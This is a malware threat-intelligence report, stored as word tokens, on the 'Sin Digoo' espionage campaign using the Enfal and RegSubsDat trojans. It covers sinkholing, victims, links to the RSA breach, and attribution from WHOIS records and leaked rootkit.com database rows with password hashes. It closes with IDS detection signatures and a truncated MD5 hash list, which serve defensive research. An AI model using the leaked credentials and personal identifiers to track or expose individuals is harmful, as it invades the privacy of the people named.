"Weber", "titled", "\"", "Malware", "Characteristics", "Report", "-", "Trojan", "."], ["RegSubsDat", "."], ["A", "\"", "on", "his", "Security", "Ripcord", "blog", "."], ["Figure", "3", "."], ["Sin", "Digoo", "connection", "to", "RegSubsDat", "malware"], ["Although", "windowsaupdate.com", "is", "not", "a", "\"", "Tawnya", "Grilth", "\"", "domain", "according", "to", "the", "WHOIS", "data", ",", "the", "name", "is", "almost", "certainly", "related", "to", "the", "domain", "windowsaupdate.net", ",", "especially", "given", "the", "same", "subdomain", "naming", "pattern", "(", "e.g.", ",", "v4", ",", "v12", ",", "v14", ")", "."], ["Victim", "discovery"], ["CTU", "analysts", "sinkholed", "a", "number", "of", "the", "\"", "Tawnya", "Grilth", "\"", "domains", "in", "2011", "and", "2012", "."], ["Traffic", "from", "infected", "victim", "computers", "is", "now", "sent", "to", "servers", "that", "log", "connections", ",", "gather", "statistics", ",", "and", "notify", "victims", "when", "possible", "."], ["The", "initial", "findings", "from", "the", "sinkholing", "activity", "are", ":", "1", "."], ["Between", "100", "and", "200", "computers", "located", "in", "Vietnam", ",", "Brunei", ",", "and", "Myanmar", "are", "infected", "by", "RegSubsDat", "."], ["Analysis", "of", "the", "IP", "addresses", "connecting", "to", "the", "sinkhole", "show", "that", "many", "are", "government", "ministries", "."], ["Additionally", ",", "more", "than", "one", "regional", "petroleum", "company", "and", "a", "newspaper", "has", "been", "infected", "."], ["2", "."], ["A", "handful", "of", "victim", "computers", "in", "Europe", "and", "the", "Middle", "East", "are", "infected", "by", "RegSubsDat", ",", "Enfal", ",", "and", "one", "other", "unknown", "trojan", "."], ["These", "computers", "belong", "to", "government", "ministries", "in", "different", "countries", ",", "an", "embassy", ",", "a", "nuclear", "safety", "agency", ",", "and", "other", "business", "-", "related", "groups", "."], ["Additionally", ",", "there", "is", "an", "embassy", "located", "inside", "mainland", "China", "that", "is", "infected", "."], ["The", "CTU", "researchers", "have", "notified", "many", "of", "the", "national", "computer", "security", "incident", "response", "teams", "(", "CSIRTs", ")", "in", "the", "countries", "where", "infections", "were", "detected", "and", "are", "continuing", "this", "notification", "process", "."], ["The", "notifications", "include", "the", "necessary", "information", "to", "locate", "victims", "within", "the", "country", ",", "inform", "the", "victims", ",", "and", "mitigate", "the", "infections", "."], ["Link", "to", "RSA", "breach"], ["In", "addition", "to", "the", "GhostNet", "link", ",", "connections", "can", "also", "be", "drawn", "between", "the", "malware", "used", "in", "the", "Sin", "Digoo", "activity", "and", "the", "RSA", "breach", "revealed", "in", "early", "2011", "."], ["According", "to", "the", "US", "-", "CERT", "EWIN-11", "-", "077", "bulletin", ",", "a", "number", "of", "command", "-", "and", "-", "control", "(", "C2", ")", "hostnames", "used", "by", "RegSubsDat", "shared", "three", "different", "IP", "addresses", "at", "different", "points", "in", "time", ",", "with", "one", "of", "the", "hostnames", "known", "to", "be", "part", "of", "the", "RSA", "breach", "."], ["This", "C2", "hostname", "was", "used", "in", "a", "piece", "of", "malware", "known", "as", "\"", "Murcy", "\"", ",", "which", "was", "detailed", "in", "\"", "Command", "and", "Control", "in", "the", "Fifth", "Domain", ",", "\"", "a", "2012", "report", "by", "Command", "Five", "Pty", "Ltd.", "Figure", "4", "."], ["Connection", "between", "the", "RegSubsDat", "malware", "and", "the", "Murcy", "malware", "."], ["All", "three", "IP", "addresses", "belong", "to", "the", "China", "Beijing", "Province", "Network", "(", "AS4808", ")", "."], ["Although", "the", "RegSubsDat", "and", "Murcy", "C2s", "shared", "these", "IPs", "a", "few", "months", "apart", ",", "the", "fact", "that", "three", "IP", "different", "addresses", "at", "the", "same", "ISP", "overlapped", "in", "a", "short", "time", "frame", "seems", "to", "indicate", "shared", "infrastructure", "used", "by", "both", "the", "RSA", "breach", "actors", "and", "other", "actors", "using", "the", "RegSubsDat", "malware", "."], ["AS4808", "is", "known", "for", "many", "other", "connections", "to", "malware", "and", "is", "considered", "by", "some", "to", "be", "a", "hotbed", "of", "espionage", "C2s", ",", "especially", "the", "123.120.96.0/19", ",", "114.248.80.0/20", "and", "114.248.96.0/20", "subnets", "."], ["These", "subnets", "have", "been", "seen", "in", "DNS", "records", "for", "hundreds", "of", "C2", "hostnames", "for", "dozens", "of", "custom", "malware", "families", ",", "either", "known", "for", "or", "suspected", "in", "espionage", "activity", "."], ["The", "RegSubsDat", "asia-online.us", "domain", "was", "registered", "by", "an", "unknown", "actor", "using", "the", "email", "address", "king_public@hotmail.com", "."], ["A", "2011", "blog", "posting", "by", "\"", "Cyb3rsleuth", "\"", "traced", "this", "email", "address", "to", "a", "social", "media", "profile", "created", "by", "a", "person", "living", "in", "Beijing", "named", "\"", "Wang", "Liang", "Chen", ".", "\""], ["The", "same", "email", "address", "was", "used", "to", "register", "many", "other", "RegSubsDat", "domains", "as", "well", "."], ["The", "social", "media", "profile", "for", "king_public@hotmail.com", "has", "since", "been", "deleted", "."], ["Tracking", "Tawnya"], ["The", "same", "type", "of", "open", "-", "source", "intelligence", "can", "be", "used", "to", "gather", "information", "about", "the", "jeno_1980@hotmail.com", "actor", "."], ["One", "domain", "registered", "by", "jeno_1980@hotmail.com", "is", "\"", "socialup.net", "\"", "."], ["This", "site", "describes", "a", "\"", "like", "exchange", ",", "\"", "which", "is", "a", "service", "that", "Internet", "marketers", "can", "use", "to", "promote", "a", "story", "on", "social", "media", "sites", "like", "Digg", "or", "Reddit", "."], ["Figure", "5", "."], ["Screenshot", "of", "the", "socialup.net", "interface", "."], ["This", "type", "of", "service", "falls", "under", "the", "category", "of", "\"", "blackhat", "SEO", ",", "\"", "a", "term", "for", "a", "variety", "of", "techniques", "for", "manipulating", "search", "engines", "and", "social", "media", "sites", "for", "marketing", "purposes", "."], ["These", "methods", "are", "considered", "\"", "blackhat", "\"", "because", "they", "usually", "lead", "to", "a", "site", "or", "user", "being", "banned", "from", "the", "search", "engine", "or", "social", "media", "sites", "if", "the", "manipulation", "is", "discovered", "."], ["The", "socialup.net", "website", "has", "been", "repeatedly", "promoted", "on", "blackhat", "SEO", "message", "boards", "by", "various", "personas", ",", "including", "one", "named", "\"", "Tawnya", "\"", "."], ["Figure", "6", "."], ["Example", "of", "\"", "Tawnya", "\"", "promoting", "socialup.net", "."], ["Once", "a", "user", "signs", "up", "with", "socialup.net", ",", "they", "can", "earn", "virtual", "\"", "coins", "."], ["\"", "The", "coins", "can", "be", "used", "to", "promote", "the", "user", "'s", "websites", "or", "social", "media", "posts", ",", "either", "by", "viewing", "ads", "or", "liking", "other", "users", "'", "stories", "and", "links", "."], ["A", "user", "can", "also", "buy", "coins", "from", "the", "owner", "of", "socialup.net", "using", "PayPal", "."], ["Figure", "7", "."], ["Example", "of", "interface", "to", "purchase", "coins", "."], ["As", "part", "of", "the", "PayPal", "transaction", ",", "the", "potential", "customer", "can", "see", "the", "payee", "email", "address", "."], ["In", "the", "case", "of", "socialup.net", ",", "PayPal", "'s", "website", "shows", "that", "the", "payment", "for", "the", "socialup.net", "coins", "is", "sent", "to", "an", "individual", "with", "the", "initials", "jzd", "."], ["Figure", "8", "."], ["Order", "summary", "for", "coins", "showing", "payee", "information", "."], ["One", "of", "the", "other", "\"", "Tawnya", "Grilth", "\"", "domains", "is", "\"", "i-tobuy.com", "\"", "."], ["This", "domain", "was", "registered", "in", "2004", "using", "the", "jeno_1980@hotmail.com", "email", "address", "and", "\"", "Sin", "Digoo", "\"", "location", ",", "but", "the", "nickname", "\"", "xxgchappy", "\"", "is", "also", "shown", "in", "the", "registrant", "contact", "data", "."], ["Figure", "9", "."], ["Registrant", "contact", "data", "for", "i-tobuy.com", "."], ["Another", "domain", "registered", "in", "2004", "using", "the", "\"", "Sin", "Digoo", "\"", "location", "was", "\"", "1stsale.net", "\"", ",", "registered", "to", "a", "\"", "john", "twk", "\"", "with", "the", "email", "address", "xxgchappy@vip.sina.com", "."], ["Figure", "10", "."], ["Registrant", "contact", "data", "for", "1stsale.net", "."], ["There", "is", "a", "profile", "on", "a", "Chinese", "programmers", "'", "forum", "for", "an", "\"", "xxgchappy", "\"", "user", "who", "has", "posted", "two", "different", "email", "addresses", "in", "different", "messages", "on", "the", "site", "."], ["These", "addresses", "are", "xxgchappy@vip.sina.com", "and", "@sina.com.cn", "(", "address", "redacted", ")", "."], ["The", "user", "'s", "name", "is", "listed", "on", "the", "forum", "'s", "profile", "page", "for", "\"", "xxgchappy", "\"", "and", "contains", "the", "initials", "ZD", "."], ["Figure", "11", "."], ["Profile", "for", "xxgchappy", "."], ["Figure", "12", "."], ["Tracing", "the", "connections", "between", "socialup.net", ",", "i-tobuy.com", ",", "and", "1stsale.net", "."], ["Several", "clues", "on", "the", "Internet", "point", "to", "xxgchappy", ",", "or", "ZD", ",", "having", "a", "working", "knowledge", "of", "computer", "programming", "."], ["The", "use", "of", "the", "programmers", "'", "forum", ",", "along", "with", "postings", "to", "that", "site", ",", "indicates", "he", "is", "interested", "in", "code", "related", "to", "hooking", "Windows", "API", "functions", ",", "a", "common", "technique", "used", "in", "malware", "."], ["Additionally", ",", "both", "xxgchappy@vip.sina.com", "and", "king_public@hotmail.com", "were", "the", "listed", "email", "addresses", "for", "users", "of", "the", "\"", "rootkit.com", "\"", "site", ",", "revealed", "when", "that", "site", "'s", "database", "was", "leaked", "in", "2011", "."], ["A", "\"", "rootkit", "\"", "is", "a", "program", "used", "for", "hiding", "traces", "of", "malware", "on", "a", "system", ",", "and", "rootkit.com", "was", "a", "forum", "for", "discussing", "the", "latest", "rootkit", "technolo-", "gies", "."], ["However", ",", "simply", "having", "an", "account", "on", "rootkit.com", "does", "not", "imply", "one", "is", "using", "rootkits", "offensively", "\u2014", "many", "anti", "-", "malware", "researchers", "were", "also", "members", "of", "the", "site", "."], ["There", "are", "some", "interesting", "clues", "in", "the", "database", "table", "for", "both", "users", "."], ["The", "nickname", "\"", "Jeno", "\"", "appears", "again", "in", "the", "rookit.com", "user", "database", "entry", "for", "the", "user", "with", "the", "email", "address", "xxgchappy@vip.sina.com", "."], ["(", "7523,'Jeno','91cec994','Jeno", "Alix','xxgchappy@vip.sina.com',1,0", ",", "''", ",", "''", ",", "''", ",", "''", ",", "''", ",", "''", ",", "0,'http://www.rootkit.com", "/", "usericons", "/", "Jeno.jpg", "'", ",", "''", ",", "1265784473,'123.6.89.98',0,0,0,1265721022,0,0,0,'','0','','','',-1", ",", "''", ")", ",", "(", "23025,'king", "-", "rose','e211f11c0b28434bf7f1c8fb510fa9ae','Club", "-", "tom", "'", ",", "'", "king_public@hotmail.com',1,1106582903,'','','','','','',0", ",", "''", ",", "''", ",", "1106837367,'61.51.59.63',0,0,0,1106583113,0,0,0,'BH','19800126", "'", ",", "''", ",", "''", ",", "''", ",", "0", ",", "''", ")", ",", "Figure", "13", "."], ["Database", "entries", "with", "the", "xxgchappy", "and", "king_public", "email", "addresses", "."], ["In", "the", "entry", "for", "king_public@hotmail.com", ",", "we", "see", "the", "nicknames", "\"", "king", "-", "rose", "\"", "and", "\"", "Club", "-", "tom", "\"", ",", "but", "even", "more", "interesting", "is", "the", "password", "hash", "\"", "e211f11c0b28434bf7f1c8fb510fa9ae", "\"", "."], ["This", "password", "hash", "appears", "in", "only", "one", "other", "entry", "in", "the", "rootkit.com", "database", ":", "(", "20446,'king", "-", "z','e211f11c0b28434bf7f1c8fb510fa9ae','k", ",", "z", ",", "y", "'", ",", "'", "wzy_100@hotmail.com',1,1097652186,'','','','','','',0,'','',1284013010", ",", "'", "123.120.127.153',0,0,0,1284013010,0,0,0,'','','','','',0", ",", "''", ")", ",", "Figure", "14", "."], ["Other", "appearance", "of", "the", "password", "hash", "associated", "with", "king_public@hotmail.com", "."], ["From", "this", "evidence", ",", "we", "can", "deduce", "that", "\"", "king", "-", "z", "\"", "is", "a", "second", ",", "earlier", "account", "of", "king_public@hotmail.com", ",", "created", "using", "the", "wzy_100@hotmail.com", "email", "address", "."], ["Even", "more", "interesting", "is", "the", "123.120.127.153", "IP", "address", "the", "king", "-", "z", "account", "used", "to", "log", "in", "."], ["This", "IP", "is", "located", "inside", "one", "of", "the", "AS4808", "netblocks", "famous", "for", "espionage", "activity", "."], ["In", "fact", ",", "it", "is", "remarkably", "close", "to", "123.120.127.159", ",", "an", "IP", "used", "by", "Enfal", "C2", "v2.windowsaupdate.net", "(", "one", "of", "the", "\"", "Tawnya", "Grilth", "\"", "domains", ")", "on", "September", "27", ",", "2010", "."], ["The", "last", "account", "activity", "for", "king", "-", "z", "as", "shown", "in", "the", "rootkit.com", "database", "is", "September", "9", ",", "2010", "."], ["This", "data", "strongly", "suggests", "that", "king_public@hotmail.com", "is", "not", "just", "a", "stolen", "account", "used", "to", "register", "a", "domain", ",", "but", "that", "the", "user", "is", "involved", "in", "the", "espionage", "network", "in", "some", "manner", "."], ["The", "password", "used", "by", "xxgchappy@vip.sina.com", "does", "not", "appear", "elsewhere", "in", "the", "leaked", "rootkit.com", "database", ";", "however", ",", "another", "leaked", "database", "may", "provide", "additional", "clues", "surrounding", "the", "xxgchappy", "personality", "."], ["The", "@sina.com.cn", "(", "address", "redacted", ")", "email", "address", "associated", "with", "the", "user", "xxgchappy", "can", "be", "found", "inside", "an", "archive", "posted", "to", "the", "\"", "hackchina.com", "\"", "website", "."], ["xxgchappy", "#", "2710", "#", "@sina.com.cn"], ["Figure", "15", "."], ["xxgchappy", "reference", "from", "the", "hackchina.com", "website", "."], ["The", "archive", "contains", "a", "denial", "-", "of", "-", "service", "attack", "tool", "called", "\"", "lankiller", "\"", "."], ["Inside", "the", "lankiller", "binary", "is", "the", "following", "comment", ":"], ["Designed", "for", "lyh", "by", "xxgc", "-", "happy", "2002.3.8"], ["Figure", "16", "."], ["Reference", "to", "xxgc", "-", "happy", "in", "the", "lankiller", "tool", "."], ["Also", "included", "in", "the", "lankiller", "archive", "is", "a", "README", "file", "that", "describes", "the", "use", "of", "the", "tool", "."], ["It", "asks", "the", "user", "to", "email", "the", "author", "at", "either", "@sina.com.cn", "or", "happy@sohu.com.cn", "."], ["Figure", "17", "."], ["Email", "addresses", "referenced", "in", "the", "lankiller", "README", "file", "."], ["There", "is", "a", "profile", "for", "\"", "happy", "\"", "on", "a", "Chinese", "video", "site", "showing", "a", "possible", "photo", "of", "the", "user", "."], ["The", "photo", "is", "of", "a", "man", "who", "appears", "to", "be", "in", "his", "early", "twenties", "and", "of", "Asian", "descent", "."], ["Conclusion"], ["The", "Sin", "Digoo", "activity", "is", "only", "a", "limited", "view", "into", "a", "very", "large", "amount", "of", "espionage", "-", "by", "-", "malware", "that", "is", "happening", "in", "the", "world", "."], ["The", "Enfal", ",", "RegSubsDat", ",", "and", "Murcy", "malware", "families", "possess", "dozens", "of", "defunct", "and", "active", "C2s", ",", "and", "these", "three", "trojans", "are", "only", "a", "tiny", "subset", "of", "the", "malware", "families", "the", "Dell", "SecureWorks", "CTU", "research", "team", "knows", "to", "be", "involved", "in", "espionage", "activity", "."], ["Collaboration", "between", "government", ",", "espionage", "malware", "victims", ",", "and", "the", "computer", "security", "industry", "must", "improve", "to", "better", "defend", "against", "this", "undercurrent", "of", "activity", "that", "threatens", "to", "undermine", "an", "already", "weakened", "economy", "in", "countries", "around", "the", "world", "."], ["Appendix", "A", "\u2013", "Network", "IDS", "signatures"], ["alert", "tcp", "$", "HOME_NET", "any", "-", ">", "any", "any", "(", "msg:\"Enfal", "Trojan", "Activity", "\"", ";", "flow", ":", "established", ",", "to_server", ";", "content:\"GET|20|", "\"", ";", "depth:4", ";", "pcre:\"/^GET\\x20.*\\x2ftrandocs\\x2fnetstate*\\x20HTTP\\x2f1/", "\"", ";", "reference", ":", "url", ",", "www.secureworks.com", "/", "research", "/", "threats", "/", "sindigoo/", ";", "sid:1111111111", ";)", "alert", "tcp", "$", "HOME_NET", "any", "-", ">", "any", "any", "(", "msg:\"Enfal", "Trojan", "Activity", "\"", ";", "flow", ":", "established", ",", "to_server", ";", "content:\"GET|20|", "\"", ";", "depth:4", ";", "pcre:\"/^GET\\x20.*\\x2f(category2|data\\x2fforum|httpdocs\\x2fmm|trandocs\\x2fmm).*[A", "-", "F0", "-", "9]{2}\\x2d[A", "-", "F0", "-", "9]{2}\\x2d[A", "-", "F0", "-", "9]{2}\\x2d[AF0", "-", "9]{2}\\x2d[A", "-", "F0", "-", "9]{2}\\x2d[A", "-", "F0", "-", "9", "]", "{", "2}\\x2f(showNumber|WindowTask|ORDERTIP|ComMand\\x2esec|Cmwhite|ComMand\\x2esec|Command.txt|Query.txt|sunrise|Tiblue|Trblu", "reference", ":", "url", ",", "www.secureworks.com", "/", "research", "/", "threats", "/", "sindigoo/", ";", "sid:1111111112", ";)", "alert", "tcp", "$", "HOME_NET", "any", "-", ">", "any", "any", "(", "msg:\"Enfal", "Trojan", "Activity", "\"", ";", "flow", ":", "established", ",", "to_server", ";", "content:\"POST|20|", "\"", ";", "depth:5", ";", "content:!\"|0a|Referer|3a20|", "\"", ";", "pcre:\"/^POST\\x20.*\\x2fcg[az]\\x2dbin\\x2f(Clnpp5|CMS_ClearAll|CMS_ListImg|CMS_SubitAll|dieosn83|Dskx8|Htrc3|Info|Owpp4|Owpq4|Rwpq1|Trpq8|Trpq8|vip)\\x", "reference", ":", "url", ",", "www.secureworks.com", "/", "research", "/", "threats", "/", "sindigoo/", ";", "sid:1111111113", ";)", "alert", "tcp", "$", "HOME_NET", "any", "-", ">", "any", "any", "(", "msg:\"Enfal", "Trojan", "Activity", "\"", ";", "flow", ":", "established", ",", "to_server", ";", "content:\"POST|20|", "\"", ";", "depth:5", ";", "pcre:\"/^POST\\x20.*\\d{6,12}\\x2ephp\\x20HTTP\\x2f1.*\\r\\n\\r\\n[a", "-", "z0", "-", "9\\x2d]{4,15}\\x3a[A", "-", "F0", "-", "9]{2}\\x2d[A", "-", "F0", "-", "9]{2}\\x2d[A", "-", "F0", "-", "9]{2}\\x2d[A", "-", "F09]{2}\\x2d[A", "-", "F0", "-", "9]{2}\\x2d[A", "-", "F0", "-", "9]{2}/s", "\"", ";", "reference", ":", "url", ",", "www.secureworks.com", "/", "research", "/", "threats", "/", "sindigoo/", ";", "sid:1111111114", ";)", "alert", "tcp", "$", "HOME_NET", "any", "-", ">", "any", "any", "(", "msg:\"RegSubsDat", "Trojan", "Activity", "\"", ";", "flow", ":", "established", ",", "to_server", ";", "content:\"POST|20|", "\"", ";", "depth:5", ";", "content:\"|2f|log|20|HTTP|2f|1", "\"", ";", "pcre:\"/^POST\\x20.*\\x2f[A", "-", "F0", "-", "9]{6}0000\\x2flog\\x20HTTP\\x2f1/", "\"", ";", "reference", ":", "url", ",", "www.secureworks.com", "/", "research", "/", "threats", "/", "sindigoo/", ";", "sid:1111111115", ";)", "Appendix", "B", "\u2013", "Malware", "hashes"], ["MD5", "signatures", "for", "Enfal", "0144f8d76662fc382b8eb094eb347e4b", "01a5adace93ad5afac400f9589b62607"], ["027d7db3d2a94bb0dfadc71300aaee3e", "02857b2b6cc5aa750dbfb6a1088a5239", "035f2e58144209ea9973bbe4cad58e15"], ["04cb272bbe383707574005a2999f2fe0"], ["054688eb39ea0cd380bb89b6746abc4f", "06572d93d87a8d0fb7e070be79692c87"], ["066be8f9e08acfe8ab1eecb884a73801"], ["071d01bcaadc9df5683a6cfa81736714", "084e99653956350210beb13c8ea43c79", "09c44fcceb51f9affdb63b0d8f9e4b31", "0a5446da47609868101c773e928b36e4", "0bbd1f253e928cafa3c9c78cdaa849bd"], ["0c589418274ba97663853d1c6bef3bd1", "0ecd791525cc30ced610e81ef67290b0"], ["0ed85a30083fb71452916e14a4b5936a"], ["10162681b64c72834621c6fd68b6501f", "106db67336a318b6ee4f3197027df85c", "113a066b19737b59ab1e2ad921cf3a03", "113bea934d89d0cfdc445489f0eb713d"], ["11696e0f7399986c4978e35f3160c22b"], ["1175fff7b282db3b2b0c8c9517bcd937"], ["11cf5c71ddf9a666d9b470dff21c4ec5", "13d82eaadf0a5f6fd2d76b66673efa91", "140c69ea9a963100e75497b33820f1da", "164e3c7488b70d6db28cf71cbc72b0c2"], ["173ec685aa9f581a03c30866b5021574"], ["17810c2ad162c4726729b3fc3ae8676e", "184f2de39a9fcc0039eb9df09c4e75b8", "19cddfee52c7b7adf4d5dd3e98e0b0bd", "1c1f7b32d5381335b83af545b9eef101"], ["1c2aab24d699c24cec860e73c767bce7", "1e95875e6c0f054b62c94d6063ff9eed", "1f91d940c42f216cf95e724a034802db", "1fa520329a77d01aaaf5808ddf529ce2"], ["21b761b4401d290b9e02fea87f2a9933", "2370a2142bc61c520226d188e102a727", "241aaa7d73339c1624a27fcce5d1815d"], ["24decc7e98e67e3a6e5d34f284f79124", "25710d277596d09e5607f419eb63e11d", "272fffde11c97b31cf9de7c1e1816d61", "276495490cf16318735f880785203378"], ["2880436cf619a270e6c31d9da6eb426b", "289242778ef037e02106a491de38cc1f", "2944e486b252112720098860a91788e0"], ["297158cfce8fc76789ca41899f6047ac"], ["2ae27d10e04d229c937c0363c29ed3e8", "2bc74b3aff2fd68eb38820bb0760f3a6", "2bfd304e3433cb0de9c2f284e9417409", "2f2f61d3b8f5064affb11e67ae6320b2"], ["2fd6e2c7fc80ab9a6be6a0eebd09763e", "2fdaa46fff13f87dcc22fb9aef9ba338"], ["300dcc10df87a998b08dddd2dbc55a28", "30971caaf134d7706c70335f54e3188f", "30d075afef4e518f63c0b43b8c764e12"], ["3270d18157131f216468cf7ce53ee8d1"], ["331140c7ffaea93ed807f86720b5929e", "331acc687cf2b93fc7bfed257ea54488", "33eb9e349ec9e093c54028e7c1cd8b0a"], ["340c9de8ff62134bb0e51c24c0919576", "343cef9a8d83afca81918fc317f3ccb8", "3447416fbbc65906bd0384d4c2ba479e"], ["34563d4ccf2fdd8a08b05089d82a803b", "347906343329916ace3636a541c96f26", "34f53d0b59f7cf352aace044abf95df3", "35369bf701904b17725429e8cb938645"], ["35ca158ffd5965d68f7ef64ee527a028"], ["3603c2b0262ed71402fe981991ddd614"], ["367459c45eec216b6858e7b2f91e0c99", "36b1f9def6a794ae0be8148d149e5fe7"], ["36d10e8d5e95bcfed701df530de2a917", "36dccde0de343af9e7f08128900334f2", "36e8c4f5b906e2e4cc3d5e64b79b8642"], ["374b6371918ab0ba91e9f3489e5eab19"], ["39762af48276967a54372dca1f89936c", "3b159b70f6f6e66db77dd6b57f04ec2f"], ["3b5fdfff3f49f0231586dd4fcca7c25d", "3c1c15ac3b1bf3787137685637e33140", "3d176273201bb6f07746cd7c5c46166c", "3d69e2b0257cebf9bc1a6f788f45fbcb"], ["3e27d880674149d2548b5b36d22570ff", "3fd66bcecc804913a016827eba28897a"], ["427259dc60c10ca5586da8d76139cc92", "42899a14835c5702af3c2f0abaf64429", "4413e592ad3c072fa300f526b83bb644"], ["442c0e4bda0035c34e767d429e7f821b", "443ed084c7bb1687825670d0293d3482"], ["453963093fa87f1ecd9be2691d080b0c", "45b8270e80fcaa229cfe8e4baf15d9c2", "45d07b1a0a6cea3035d448e384b59252"], ["45f565e1b73e723ade1838e2c78867a6", "46548ef50b1d64909f77a484bac66de6", "46679d05a02e065a5f082d86d7635488", "466cbf76ccf76e0a2fb309e9e8433bce", "46a9e994658fe49e892c5a5d5740b58a", "47bc44ccd673760918c99856a053aca0", "48a4a92443dd2595806e9afd76275ea0"], ["48ccdc7a5eec2a0240b28534d501eebb"], ["4943c536c8b06044456af9971a0f54eb"], ["499ad52953d3e12ebcda3f4eec3cad4f"], ["49e0df6cb8abc6d4554829f2cc77ad75", "4a828744a96d739815ff40d54bc9d022", "4add8281a028c6ea76d369186f787004", "4b835d7b89f754f72fa712fd281aa51f", "4bb3264ddb68e096bbd11721fea3d2e2", "4bc96cf2a63f4bfbc5f24c07329d986d"], ["4cb5033c2b4e19872d2fb98dc9678362", "4d84bd418da17f01298df489c251464f"], ["4dc08c921bc81ce89aae397eaa049dda", "4f862e38b7db5beebacff59a751b0f59"], ["5098b3d6211a17f315fb33b17e37c9b1", "50ecc77c6c831bcd7e0534353f61c479", "514c992b5af684efb08ada784f36bce7", "57ffbe0560b61ef7da39a29049dfdc45", "5b0d5ad64256811a7e8be472f3492d2d", "5b382d58d6a890ce696494c304242625"], ["5c26947e42381afa8459b6a91308662e", "5c2ebee0d8748e926d015d07c434b409"], ["5c920ea7042f820f46ca8bdeb9a17519", "5ccdc66a50b3b101d4038ab23b65196f"], ["5cf7669f0b64b0780159cae4275e75e7"], ["5dbd2ed78f47fd75112b5b8d9a5a2a7d"], ["5f76d78402be896288284c18407957b2"], ["5f84282c7ee466e777665ef72fa258b5"], ["61792bb6aa26ce5e826ee300977825c1"], ["61a605dc9bfcbdc382f528607115b8f1"], ["629dc2675a940e6fd0cfd778f2c3149a", "630e9ced15a16aaa464b73481297f40f"], ["63d33065354038eec8b8a386d5bf45bf", "6680e19b115c88416b13b5985bf2c32d", "66fc71e3f35b3ef21cf524c3be92708c"], ["67ae7ca090aed3841ca1c0ec85d26d2c"], ["687cfc99f09f1cb9b1915135bc57fbbe"], ["68a3e1c03a0ce92a648eea823bfcdd4d", "690e6208ccfc960c71175e43c75deee1"], ["6979c05ff1682c6bcff2da5f20350388"], ["69f8825118ea8ab1c671c28298c592aa"], ["6c1fa0a523a751b8d588b75814a46759"], ["6e8994d01ab6837e6baeedbfd9bf45b2"], ["701d95d5d716a726a4316d7352938510", "70cf6edb22a2fd5fee7665ad1a260b39", "70f167e43ba0c4df744601ace41d29fb"], ["71313fcf3d825ba40375cf62f4777e10", "719b1d9e93a6fe2fe0918f029990fbfd"], ["72b9b505ef199fee23db350d6e096340"], ["73802e2bb0c7f821f0959e9a424be35b"], ["744670ca4531f7ceb72a75ae456e8215", "74cb2fc990adf24f1da265dd14737d48", "7547a4e39ac61eae20c79fa3834d8e2a", "7578feae5abb684e691e44a1c82d0b78", "7769907450c95de213567408d1c3eb32", "79a160fec8c1e34b0188e034dffccfa5", "7a1d4cba9ce2a28ef586c27689b5aea7", "7a72460b0f3caeaa9a0dd5aa252a3dd5", "7bd2cf1a96fe27c301111785799233ea", "7c2258469a87138a94eb1a15578df9c1"], ["7c9836391eb08e1cfa33dd1094d2f993"], ["7db483b6dfb3952ce9c29b7bf26e662b", "7e0d522932460ea1d9a88a82980b1234"], ["7fd3760a10a79397da3e7f2531a3c165", "7fec0946aa04ac5f96c8633565a503a7", "80398a1c31cb0fad735d051f22865204"], ["8042b3849217de1ee9181ee9c7338df8"], ["80450d1256eddeece918ef02e9dedcd5", "80a8635e966a5fb6924cfd92d18b1829", "8198751a915561b30a607b1d2a651f73"], ["81df7dca8b3bb3ae964fa8cfd82de413"], ["81fa811f56247c236566d430ae4798eb", "8279af9adb9dcde15f67e4938a32e460", "83046fb020b98d6bdc59b6d3135fa293", "8330e398c976797e86e23110255774ff"], ["839ead900d516a2fe9ec7dc68c6f91dc", "84356ed469c95c1418209bd929640622", "84484706048822c4a483d9cdd4ae6136"], ["845f298eeec87f92302146aba04ee108", "84a201fa44c3675687ad2b9e3cf0adc1"], ["84b8488ce8d20cab10fe10973429d1b3"], ["84d24967cb5cbacf4052a3001692dd54", "85639dd697e36a7eeb7e84e6ddccda46", "856de08a947a40e00ea7ed66b8e02c53", "858941e84af0d2a102b26497c22265c4", "875b9628aee0a7108929ecd57f7e771d"], ["89b61f9100b8135d7356fa864598be7f"], ["89ffcc729bf4b89a298b0dd317228646", "8bfc2763ec3141e6215fe9958607b895", "8c6d058e3c821ca141cbbbcfe7afe8e8", "8ec4fc310915b6db5d62ff476d95fc87", "8fbc2220e1f505d3312542ccab2cb103"], ["90506693e1df8190ad657d519551472d"], ["908c8475c451050599909b0212857bbe", "90bf1a608159df6c4f11f6366cecb998"], ["912aad79475fd457165b3ae8c362203f"], ["9133dcec65eb468ce226e1fd8accaf4e", "923d3c72026a56bb9bc54843a6016854"], ["925cbbd8060770e9175ce0433f03ad81"], ["93cf1393241577797b36d707d4255faa", "9604700eb71a14a540ba65429d2f75cd", "97769f938619bf888a2750b4f079a134"], ["9883cee2f281ae23c4929e0eba313876"], ["9929a8ba088ec944b07c20e0d38d4355", "996cdae702fe1f0b7555764c3f4daadd", "99a0e8f84028813def520a9a7791635d", "9a09e5acd4050a68ade420fcc79c6c66"], ["9ab8cc0bd5facd7fed939ae8715c0f2f", "9ac42be9c350de30415f73471b7ced64"], ["9c909e8f3fdf46d1ab0246218f83dc71"], ["9cc962a7f637aced6117aac78f74bdf5", "9d001213c967234aef5207971b3dc084"], ["9d0bc24173b98630f45f6cbb5aef048b", "9dda46f5b3be826bf427ad6bbd8171ae", "9fe79a8d9901cf773d272b0578c818c7", "a03c312ad0309c02e29f3be32738f753", "a1a977867a889be58767f3224806aef3", "a25a0621c0381bdfe32b3f2ea6975f18", "a4cc686615d113aa18e2f984a4d69dc6", "a64e9189f49db0c1a1ae53891c8a69ef", "a6d45978a7736e6265f0243bb14a4f1d", "a6e2d6112100869191f20f49408c9459", "a714c1df854f966161192b77ff2f4cd4", "a78f479adda756ecea71246b6398ac4b", "a83fc05a18e18ba19e93a75ffa6ebd50", "a99fb261722f271234c872451512c67f", "ab5d5a99c171d3e69490a9a7fbe3645f", "ac1d99f4751ae8c28c452ae96d6bc800", "ac7eccfce8dd486b830fe85dacaf35e8"], ["ad7f7ce329139ccc252ed75704de2eab", "ad92cbb5e3522fc4bfc15732284020d0", "adab08e09dec4437be49a9346244375a", "addd471dcbff1b125f993343a27819a7", "ae4c9c1f16fbe20dd78da605f2091ad3", "ae60f66d33259207e54ce03416c10adc", "af5d3789bb5220553e7fc0d115be4655"], ["b2c52b2078060c0d8dfe3f9c84ab0f1a", "b60c862f6435247c21c7d2d05d804248", "b9685cc3d0069135696fe51fd7258aac", "ba2532bc122c881bfe4ddc39da1dfdf4", "ba3324571e0f962e4d6aced7832f4d3f", 